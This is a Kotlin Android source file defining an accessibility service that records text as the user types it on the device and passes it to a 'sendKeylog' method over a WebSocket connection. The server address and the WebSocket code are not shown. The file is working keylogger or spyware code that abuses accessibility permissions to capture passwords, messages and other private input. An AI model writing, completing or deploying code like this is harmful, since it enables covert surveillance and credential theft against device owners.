package com.wuzen.service

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import kotlinx.coroutines.*

class WuzenAccessibilityService : AccessibilityService() {
    private val scope = CoroutineScope(Dispatchers.IO)
    override fun onServiceConnected() {
        super.onServiceConnected()
        WebSocketManager.connect(this)
    }
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val text = event.text.joinToString("")
            scope.launch { WebSocketManager.sendKeylog(text) }
        }
    }
    override fun onInterrupt() {}
    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}